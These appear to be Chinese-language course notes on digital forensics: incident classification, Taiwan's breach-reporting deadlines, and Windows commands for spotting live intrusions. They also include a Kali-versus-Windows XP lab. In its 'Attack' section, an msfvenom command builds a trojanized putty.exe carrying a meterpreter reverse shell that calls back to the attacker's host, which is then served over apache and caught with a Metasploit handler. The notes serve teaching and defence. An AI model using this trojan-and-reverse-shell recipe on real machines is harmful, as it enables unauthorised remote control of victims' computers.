## __Digital Forensics__

- triage 
    - 普篩檢測工具
- 風險評鑑
    - 看藉由這次攻擊會不會對系統產生影響
- IOC
    - 感染指標
- IOA
    - 攻擊指標
- PT滲透測試(用手動方式去測試弱點) v.s.弱點掃描(zero day)
    
- 資安法
    - 不適用於軍事情報
    - 3級和4級2hr要通報
    - 1級和2級8hr要通報

- 等級評估
    1. 國家機密
    2. 公務機密
    3. 核心業務
    4. CI維運(醫療、金融)



    ### kali&Windows XP 實作
    1. nmap -sP 192.168.169.0/24 (Ping整個區域網路的各個主機) -> 找尋target
        - sP -> ping ICMP的封包
    2. nmap -A 192.168.169.184 ->查看哪些有弱點
    ```
    先看service name&port then service version
    ```
    3. arp-scan -l -> 去搜尋訪問switch or hub or自己的routing table(問這主機有沒有在你的table裡面)
        - 若nmap -p & arp 所出來的主機數不同，則可能是有主機關機或離線 or 不給ping(代表藏有機密)
    4. snmp-check 192.168.169.184 (對方只要有開snmp且無做任何防禦，加上IP則可以看到很多資料)
        - 被ping的人可能可以從log來查看
    
    # Attack
    - msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.169.141 (Kali's IP) LPORT=8888 -f exe -k -x /root/Downloads/putty.exe > /var/www/html/cgu.exe
        - make weapon
    - service apache2 start(若內部網路的人開了ftp http等，代表不正常 -> 正常網路不會去開Apache)
    - msfconsole (開這個被害者不會有痕跡)
    - use exploit/multi/handler
        - set lport
        - set payload
        - set lhost
```
以上三個set都要在use之後，且須對應到要送出的惡意程式
```
    
   - 被攻擊方 ->  winxp open ie + IP download 惡意程式

   - cport第三方工具
   - currports TCPview

   ## windows cmd

- step 1
    - ipconfig (看到IP，要確認是否為合法IP)
    - ipconfig /all (看到所有有關IP的東西)
- step 2 
    - arp -a (`baseline` -> list -> static IP list 固定IP清單) -> 看是否有可疑的IP或連線
    -  若為dynamic則不好搞(Thus Static IP是公司基本的設定)
- step 3
    - netstat -anbo(for checking whether there's problem or not)
```
必看 status 中的established(正在被打) & listen(等著被打)
在看到status中有established的時候要動作快 -> (1)看IP&Port
(2)右邊是Dst(遠端主機幫我們連線的IP&port) (3)看程式名稱與port&IP的關聯以及其PID

4444 8888 通常是駭客
```
  
- Ping網址與IP是不一樣的
- 指令
    - /v (把人顯示出來-> 會看到username)
    - /m 調出函式庫(DLL)
    - /svc 看有沒有開機(?
    - schtasks(判斷程式出來的結果，若有就要看，若沒有申請單說要申請什麼的schedule就代表有問題 -> 因此申請單為此baseline)
    - SIGVERIF(看什麼東西是否有簽章)
- 網站
    - whois
    - black IP list
